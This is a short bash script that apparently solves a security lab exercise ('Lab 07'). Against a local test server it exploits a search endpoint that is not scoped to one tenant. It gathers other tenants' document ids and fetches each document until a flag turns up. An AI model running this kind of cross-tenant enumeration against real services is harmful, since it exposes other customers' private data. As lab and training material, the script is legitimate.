#!/usr/bin/env bash
# Lab 07 — search is not tenant-scoped, so it hands out the other tenant's ids.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:9070}"
. "$(dirname "$0")/../lib/h5i.sh"
new_session lab07

"$H5I" browser open "$URL/api/search?q=report" --session "$SESSION" --new --capture >/dev/null

for q in a e i o u; do
    IDS="$(send "$SESSION" req_0 --reset-budget --set "query.q=$q" | body | python3 -c '
import json, sys
print(" ".join(h["id"] for h in json.load(sys.stdin)["hits"] if h["tenant"] != "acme"))')"
    for id in $IDS; do
        OUT="$(send "$SESSION" req_0 --reset-budget --set "path=/api/document/$id" | flag)"
        [ "$OUT" != "no flag found" ] && { printf '%s\n' "$OUT"; exit 0; }
    done
done
echo "no flag found"
